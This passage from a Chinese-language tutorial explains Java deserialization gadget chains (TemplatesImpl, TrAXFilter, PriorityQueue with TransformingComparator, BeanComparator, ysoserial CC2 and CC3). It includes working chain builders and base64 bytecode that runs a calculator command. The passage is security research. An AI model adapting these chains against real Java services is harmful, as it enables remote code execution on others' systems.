指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar 包或远程 http 服务器上读取字节码，然后交给 defineClass\ndefineClass 的作用是处理前面传入的字节码，将其处理成真正的 Java Class 实例\n\n下面的代码展示通过 ClassLoader#defineClass 加载字节码的过程，\npublic static void main(String[] args) throws Exception {\n\t// defineClass 方法为 protected，无法直接访问\n\tMethod defineClass =\n\t\t\tClassLoader.class.getDeclaredMethod(\n\t\t\t\t\t&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);\n\tdefineClass.setAccessible(true);\n\tbyte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAHQwAHgAfAQASb3BlbiAtYSBjYWxjdWxhdG9yDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAMACAAOAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA8AAAAHAAJMBwAQCQABABEAAAACABI=&quot;);\n\tClass&lt;?&gt; evil =\n\t\t\t(Class&lt;?&gt;)\n\t\t\t\t\tdefineClass.invoke(\n\t\t\t\t\t\t\tClassLoader.getSystemClassLoader(), &quot;Evil&quot;, code, 0, code.length);\n\tevil.newInstance();\n}\n你可以通过获取 Evil.class base64 编码后对内容\ncat Evil.class | base64\n\n需要注意 ClassLoader#defineClass/loadClass 方法默认都不会对类进行初始化，需要调用 newInstance 方法才能触发执行。\n\nTemplatesImpl\n通常类加载器的大部分接口是不对外开放到，但是总会有开发人员对类加载器进行封装，这给了我们机会。TemplatesImpl 就是其中之一。\nTemplatesImpl 源自 org.apache.xalan:xalan，原本是一个独立的工件包，之后被合入到 JDK 中，并将包名更改为 com.sun.org.apache.xalan\n\nXalan 是 XML 的拓展功能的一种，支持将 XML 转换为 HTML 或其它标记性语言，由 IBM 提出，标准见 www.w3.org/TR/xslt 。\n\nTemplatesImpl 内部实现了一个类加载器 TransletClassLoader，它重写了 defineClass 方法作用域为 default，可以被外部调用。\nClass defineClass(final byte[] b) {\n\treturn defineClass(null, b, 0, b.length);\n}\n在 TemplatesImpl 内部 getTransletInstance 方法会使用 defineClass\nprivate Translet getTransletInstance()\n\tthrows TransformerConfigurationException {\n\ttry {\n\t\tif (_name == null) return null;\n \n\t\tif (_class == null) defineTransletClasses();\n\t\t// The translet needs to keep a reference to all its auxiliary\n        // class to prevent the GC from collecting them\n\t\tAbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); // [7] 调用了 newInstance 方法\n调用路径是 getTransletInstance→ defineTransletClasses→ defineClass，但 getTransletInstance 是私有方法，但还有另外两个方法能够调用到 getTransletInstance， TemplatesImpl#newTransformer 和 TemplatesImpl#getOutputProperties，[8] 会调用 getTransletInstance 方法。\npublic synchronized Transformer newTransformer()\n\tthrows TransformerConfigurationException\n{\n\tTransformerImpl transformer;\n \n\ttransformer = new TransformerImpl(getTransletInstance(), _outputProperties,\n\t\t_indentNumber, _tfactory); // [7] 调用 getTransletInstance\n\t// ...\n \npublic synchronized Properties getOutputProperties() {\n\ttry {\n\t\treturn newTransformer().getOutputProperties(); // [8] 调用 newTransformer\n\t}\n\t// ...\nTemplatesImpl 大部分方法都是 private 或 protocted，无法使用常规方法设置它的成员，这里可以直接使用反射。\npublic static void main(String[] args) throws Exception {\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n \n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAHQwAHgAfAQASb3BlbiAtYSBjYWxjdWxhdG9yDAAgACEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAIgEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAMACAAOAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA8AAAAHAAJMBwAQCQABABEAAAACABI=&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n\ttemplatesImpl.newTransformer();\n}\n使用前面的 Evil 类，并尝试调用 TemplatesImpl#newTransformer 方法，但并没有成功执行，并且抛出如下异常\nException in thread &quot;main&quot; java.lang.NullPointerException\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:422)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)\n\tat com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)\n\tat com.trganda.loader.TemplatesImplLoader.main(TemplatesImplLoader.java:18)\n\n产生错误的原因在 defineTransletClasses 方法中，前面设定的 _bytecodes 长度是 1，所以这里的 _auxClasses 为 null 从而引发异常。\nfinal int classCount = _bytecodes.length;\n_class = new Class[classCount];\n \nif (classCount &gt; 1) {\n\t_auxClasses = new HashMap&lt;&gt;();\n}\n \nfor (int i = 0; i &lt; classCount; i++) {\n\t_class[i] = loader.defineClass(_bytecodes[i]);\n\tfinal Class superClass = _class[i].getSuperclass();\n \n\t// Check if this is the main class\n\tif (superClass.getName().equals(ABSTRACT_TRANSLET)) {\n\t\t_transletIndex = i;\n\t}\n\telse {\n\t\t_auxClasses.put(_class[i].getName(), _class[i]);\n\t}\n}\n \nif (_transletIndex &lt; 0) {\n\tErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);\n\tthrow new TransformerConfigurationException(err.toString());\n}\n那么让 _bytecodes 长度大于 1 就可以了吗？也不行，因为 _transletIndex 必须大于等于 0 方法才能正常返回。而这里有一个条件 superClass.getName().equals(ABSTRACT_TRANSLET)， 要求父类为 ABSTRACT_TRANSLET\ncom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\nEvilTranslet.java\n按照判断条件重新编写一个 EvilTranslet.java\npublic class EvilTranslet extends AbstractTranslet {\n    static {\n        try {\n            Runtime.getRuntime().exec(&quot;open -a calculator&quot;);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n \n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n \n    }\n \n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n \n    }\n}\nTemplatesImplLoader.java\n将 EvilTranslet 编译后，替换字节码的内容并再次尝试\npublic class TemplatesImplLoader {\n    public static void main(String[] args) throws Exception {\n        TemplatesImpl templatesImpl = new TemplatesImpl();\n \n        Reflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n        Reflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n        byte[] code =\n                Base64.getDecoder()\n                        .decode(\n                                &quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n        Reflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n        templatesImpl.newTransformer();\n    }\n}\n运行一下就可以看到弹窗了\n\n\n类加载的方式有很多种，除了使用 TemplatesImpl，常见的还有 BCEL。\n\nTrAXFilter\nTemplatesImpl 触发类加载的 public 方法只有两个，\n\nTemplatesImpl#newTransformer\nTemplatesImpl#getOutputProperties\n\n而 TemplatesImpl#readObject 方法中并没有什么有用的东西，所以想使用此利用链需要找到能够触发上述两个方法之一的工具类。\n而其中一个，就是 TrAXFilter，它也是 org.apache.xalan 中的类，在构造方法中能够调用 newTransformer 方法。\npublic TrAXFilter(Templates templates)  throws\n\tTransformerConfigurationException\n{\n\t_templates = templates;\n\t_transformer = (TransformerImpl) templates.newTransformer();\n\t_transformerHandler = new TransformerHandlerImpl(_transformer);\n\t_useServicesMechanism = _transformer.useServicesMechnism();\n}\nInstantiateTransformer\n那么如何调用构造方法？转了一圈，还得回到 commons-collections，Transformer 的实现类 InstantiateTransformer。\nInstantiateTransformer 的 tranform 方法可以调用指定对象的构造方法\npublic Object transform(Object input) {\n\ttry {\n\t\tif (input instanceof Class == false) {\n\t\t\tthrow new FunctorException(\n\t\t\t\t&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;\n\t\t\t\t\t+ (input == null ? &quot;null object&quot; : input.getClass().getName()));\n\t\t}\n\t\tConstructor con = ((Class) input).getConstructor(iParamTypes);\n\t\treturn con.newInstance(iArgs);\nTemplatesImplTrAXFilterExec.java\n有了前面的先验知识，只需要将 LazyMapAnnotationExec.java 稍加修改就可以了。有没有拼积木的感觉？你甚至可以套用前面的内容，替换掉 AnnotationInvocationHandler，整一个更简单点的利用链。\npublic static Object getObject() throws Exception {\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n \n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\t\tBase64.getDecoder()\n\t\t\t\t\t.decode(\n\t\t\t\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\tChainedTransformer fakeTransformer =\n\t\t\tnew ChainedTransformer(new Transformer[] {new ConstantTransformer(&quot;1&quot;)});\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(TrAXFilter.class),\n\t\t\t\t\t\tnew InstantiateTransformer(new Class[] {Templates.class}, new Object[] {templatesImpl})\n\t\t\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), fakeTransformer);\n \n\tInvocationHandler handler =\n\t\t\t(InvocationHandler)\n\t\t\t\t\tReflections.getFirstCtor(\n\t\t\t\t\t\t\t\t\t&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t\t\t\t.newInstance(Override.class, lazyMap);\n \n\tMap map =\n\t\t\t(Map)\n\t\t\t\t\tProxy.newProxyInstance(\n\t\t\t\t\t\t\tClassLoader.getSystemClassLoader(),\n\t\t\t\t\t\t\tnew Class[] {Map.class},\n\t\t\t\t\t\t\thandler);\n \n\tInvocationHandler anotherHandler =\n\t\t\t(InvocationHandler)\n\t\t\t\t\tReflections.getFirstCtor(\n\t\t\t\t\t\t\t\t\t&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t\t\t\t.newInstance(Override.class, map);\n\tReflections.setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);\n \n\treturn anotherHandler;\n}\nysoserial/CommonsCollections3\nCC3 的实现思路和前面是一样的。\npublic Object getObject(final String command) throws Exception {\n\tObject templatesImpl = Gadgets.createTemplatesImpl(command);\n \n\t// inert chain for setup\n\tfinal Transformer transformerChain = new ChainedTransformer(\n\t\tnew Transformer[]{ new ConstantTransformer(1) });\n\t// real chain for after setup\n\tfinal Transformer[] transformers = new Transformer[] {\n\t\t\tnew ConstantTransformer(TrAXFilter.class),\n\t\t\tnew InstantiateTransformer(\n\t\t\t\t\tnew Class[] { Templates.class },\n\t\t\t\t\tnew Object[] { templatesImpl } )};\n \n\tfinal Map innerMap = new HashMap();\n \n\tfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n \n\tfinal Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);\n \n\tfinal InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);\n \n\tReflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain\n \n\treturn handler;\n}\nTemplatesImplPriorityQueueExec.java\n前面已经讲到调用 TemplatesImpl#newTransformer 一种方式，但还有更直接的，比如使用 InvokerTransformer 并配合 PriorityQueue。\n怎么配合 PriorityQueue ？\n先看看 PriorityQueue#readObject\nprivate void readObject(java.io.ObjectInputStream s)\n\tthrows java.io.IOException, ClassNotFoundException {\n\t// Read in size, and any hidden stuff\n\ts.defaultReadObject();\n \n\t// ...\n \n\t// Elements are guaranteed to be in &quot;proper order&quot;, but the\n\t// spec has never explained what that might be.\n\theapify();\n}\nPriorityQueue 是优先队列，在 readObject 中，读取内部元素后会调用 heapify 对它们进行排序。而既然是排序，就需要有比较的规则，这就得提到一个接口 java.util.Comparator。如果指定了 Comparator，那么比较时就会调用 compare 方法。\n可是这和 InvokerTransformer#tranform 有什么联系？\n还是那个熟悉的 commons-collections 库，它提供了一个工具类 TransformingComparator，它是一个装饰器，可以用 Transformer 装饰 Comparator 以此改变 Comparator 的行为。\n\nDecorates another Comparator with transformation behavior. That is, the return value from the transform operation will be passed to the decorated Comparator#compare(Object,Object) method.\n\n查看一下 TransformingComparator#compare 方法，可以看到对 transformer.transform 的调用\npublic int compare(Object obj1, Object obj2) {\n\tObject value1 = this.transformer.transform(obj1);\n\tObject value2 = this.transformer.transform(obj2);\n\treturn this.decorated.compare(value1, value2);\n}\n很好，只需通过 TransformingComparator 封装一下 InvokerTransformer 即可。\npublic static Object getObject() throws Exception {\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n \n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\t\tBase64.getDecoder()\n\t\t\t\t\t.decode(\n\t\t\t\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][] {code});\n \n\tInvokerTransformer&lt;Object, Object&gt; invokerTransformer =\n\t\t\tnew InvokerTransformer&lt;&gt;(&quot;toString&quot;, new Class[] {}, new Object[] {});\n \n\tPriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new。TransformingComparator&lt;Object, Object&gt;(invokerTransformer));\n\t// 至少放入两个元素\n\tqueue.add(1);\n\tqueue.add(2);\n \n\tReflections.setFieldValue(invokerTransformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\t// templatesImpl 需要放置在 index 为 0 的位置\n\tReflections.setFieldValue(queue, &quot;queue&quot;, new Object[]{templatesImpl, 1});\n \n\treturn queue;\n}\n这里需要注意一点，你可以选择直接放两个 templatesImpl 进入队列，而不用考虑使用反射设置 queue 成员的值。\nqueue.add(templatesImpl);\nqueue.add(templatesImpl);\n使用反射的方式可以让序列化之后的内容更小一点，由于 heapify 方法的判断条件，需要元素个数大于 2 才能触发 TransformingComparator，且要将 templatesImpl 放至在第一个。\nprivate void heapify() {\n\tfor (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)\n\t\tsiftDown(i, (E) queue[i]);\n}\n简化版调用关系梳理\nPriorityQueue.readObject();\n  heapify();\n    siftDown(i, (E) queue[i]);\n      // comparator != null 使用 comparator 进行比较\n      siftDownUsingComparator(k, x);\n \n\t\t// 调用 TransformingComparator#compare 方法\n        comparator.compare(x, (E) c)；\n          // 调用 InvokerTransformer#transform，触发后续命令执行\n          this.transformer.transform(obj1);\nCommons Collections 4 的变化\n前面构造的 TemplatesImplPriorityQueueExec.java 只能在 commons-collections4:4.0 下使用，因为 TransformingComparator 从 commons-collections4:4.0 开始才实现了 Serializable 接口；而 4.0 之后的版本 InvokerTransformer/InstantiateTransformer 等 Transformer 不支持序列化，无法再使用了。\nysoserial/CommonsCollections2\n前面的实现方式，实际就是 CC2 的实现\npublic Queue&lt;Object&gt; getObject(final String command) throws Exception {\n\tfinal Object templates = Gadgets.createTemplatesImpl(command);\n\t// mock method name until armed\n\tfinal InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[0], new Object[0]);\n \n\t// create queue with numbers and basic comparator\n\tfinal PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));\n\t// stub data for replacement later\n\tqueue.add(1);\n\tqueue.add(1);\n \n\t// switch method called by comparator\n\tReflections.setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n \n\t// switch contents of queue\n\tfinal Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);\n\tqueueArray[0] = templates;\n\tqueueArray[1] = 1;\n \n\treturn queue;\n}\n为什么需要 TemplatesImpl 利用链\n在反序列化漏洞逐渐进入公众视野后，出现了一类如 SerialKiller 的工具，通过黑名单的方式拒绝特定类的反序列化。其中就包含了 InvokerTransformer，这意味着以 InvokerTransformer 基础进行变种的各类利用链的可用性会逐渐降低。\n攻击者或安全研究人员需要一种新的方案。TemplatesImpl 利用链和 InstantiateTransformer 被发掘。\nTemplatesImplBeanComparator.java\n前面针对 TemplatesImpl 利用链的开发，都是针对 TemplatesImpl#newTransformer，那 TemplatesImpl#getOutputProperties 呢？\n当然也可以。\n这就需要介绍另一个主角 BeanComparator 了。听名字能大概知道，它也是一个 Comparator，BeanComparator 是 commons-beanutils 中的一个类。\n直接看看它的 compare 方法\npublic int compare( T o1, T o2 ) {\n \n\tif ( property == null ) {\n\t\t// compare the actual objects\n\t\treturn internalCompare( o1, o2 );\n\t}\n \n\ttry {\n\t\tObject value1 = PropertyUtils.getProperty( o1, property );\n\t\tObject value2 = PropertyUtils.getProperty( o2, property );\n\t\treturn internalCompare( value1, value2 );\n\t}\n\t// ...\n这里需要关注 PropertyUtils.getProperty 方法，查看它的注释知道返回一个 bean 的指定属性的值。\n\nReturn the value of the specified property of the specified bean, no matter which property reference format is used, with no type conversions.\n\n回头看看 TemplatesImpl，按照 JavaBean 的定义 getOutputProperties 方法对应的成员名称应该是 outputProperties（注意⚠️：这个成员并不存在，存在的是 _outputProperties）。\n那 PropertyUtils.getProperty 是否会调用 getOutputProperties 来获取 outputProperties 属性？还是通过其它方式？这里不着急深入代码查看，直接测试\n@Test\npublic void getPropertyTest() throws Exception {\n\tTemplatesImpl templatesImpl = new TemplatesImpl();\n \n\tReflections.setFieldValue(templatesImpl, &quot;_name&quot;, &quot;evil&quot;);\n\tReflections.setFieldValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\tbyte[] code =\n\t\t\tBase64.getDecoder()\n\t\t\t\t\t.decode(\n\t\t\t\t\t\t\t&quot;yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBA